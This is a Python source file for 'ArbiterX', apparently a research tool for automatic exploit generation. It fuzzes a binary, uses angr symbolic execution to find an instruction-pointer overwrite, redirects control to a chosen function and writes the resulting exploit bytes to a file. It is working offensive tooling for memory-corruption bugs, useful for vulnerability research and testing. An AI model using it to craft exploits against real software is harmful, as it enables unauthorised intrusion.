import angr
import claripy
import arbiter
import json
import logging
from .simple_fuzzer import Fuzzer

class ArbiterX:
	def __init__(self, binary, template):
		self.binary = binary
		self.proj = angr.Project(binary, auto_load_libs = False)
		self.template = json.load(open(template))
		self.sink_addrs = []
		self.source_addrs = []
		self.logger = logging.getLogger("ArbiterX")
		logging.getLogger('angr').setLevel(logging.ERROR)
		self.generate_cfg()

	def generate_cfg(self):
		self.logger.setLevel(logging.INFO)
		self.logger.info("Creating CFG for the binary "+self.binary)
		self.cfg = self.proj.analyses.CFG(fail_fast = True)

	def resolve_sources(self):
		for function in self.template["sources"]:
			self.source_addrs.append(self.find_address(function))

	def resolve_sinks(self):
		for function in self.template["sinks"]:
			self.sink_addrs.append(self.find_address(function))

	def find_address(self, function):
		self.logger.setLevel(logging.INFO)
		self.logger.info("Searching for "+function+" address")
		addrs = []
		for addr, func in self.cfg.kb.functions.items():
			if func.name == function:
				addrs.append(addr)

		if len(addrs) > 0:
			self.logger.info("Found function "+function + " at address "+hex(addrs[0]))
			return addrs[0]
		else:
			return None

	def check_reachability(self):
		for source in self.source_addrs:
			for sink, s_name in zip(self.sink_addrs, self.template["sinks"]):
				if sink == None:
					continue
				state = None
				if "stdin" in self.template["run_format"]:
					state = self.proj.factory.entry_state(args=[self.binary], stdin=angr.SimFile)
				else:
					state = self.proj.factory.entry_state(args=[self.binary])
				sim_mgr = self.proj.factory.simulation_manager(state)
				sim_mgr.explore(find=sink)

				if len(sim_mgr.found) > 0:
					self.logger.info("There is a path exists to the sink "+ s_name)
					return True
		return False

	def exploit_type(self):
		return self.exp_type
		pass

	def generate_exploit(self, filename):
		with open(filename, 'wb') as file:
			file.write(self.exploit)
		self.logger.info("Exploit is Saved to the file "+filename)

	def fuzz_binary(self):
		bin_fuzz = Fuzzer(self.binary, self.template["run_format"])
		bin_fuzz.run_fuzzer()
		if bin_fuzz.is_crashed():
			self.crash_inp = bin_fuzz.get_crash_input()

	def analyze_crash(self):
		crash_len = len(self.crash_inp) + 10
		symbolic_inp = [claripy.BVS("byte{i}", 8) for i in range(crash_len)]

		symbolic_inp_ast = claripy.Concat(*symbolic_inp + [claripy.BVV(b'\n')])

		start_state = None
		if "stdin" in self.template["run_format"]:
			start_state = self.proj.factory.full_init_state(args=[self.binary], add_options=angr.options.unicorn, stdin=symbolic_inp_ast)
		else:
			start_state = self.proj.factory.full_init_state(args=[self.binary, symbolic_inp_ast], add_options=angr.options.unicorn)

		sim_mgr = self.proj.factory.simulation_manager(start_state, save_unconstrained=True)
		sim_mgr.run()

		if len(sim_mgr.unconstrained) == 0:
			self.logger.info("No Unconstrained States Found!!")
		else:
			self.logger.info("Found Instruction Pointer Overwrite")
			self.exp_type = "ip_overwrite"

		
		vuln_state = sim_mgr.unconstrained[0]
		ip = vuln_state.regs.pc 

		
		arb_exec = self.template["exec"]
		exec_addr = self.proj.loader.find_symbol(arb_exec)

		self.logger.info("Generating Exploit to run "+arb_exec+" function "+str(exec_addr.linked_addr))
		vuln_state.add_constraints(vuln_state.regs.pc == exec_addr.linked_addr)

		self.exploit = vuln_state.solver.eval(symbolic_inp_ast, cast_to=bytes)

	def get_crash(self):
		return self.crash_inp

	def get_sources(self):
		return self.template["sources"]

	def get_sinks(self):
		return self.template["sinks"]


# Testing 
if __name__ == '__main__':
	
	arb = ArbiterX("../examples/vuln","template_ex.json")
	arb.resolve_sources()
	arb.resolve_sinks()
	arb.check_reachability()
	arb.fuzz_binary()
	arb.analyze_crash()
	arb.generate_exploit("exp")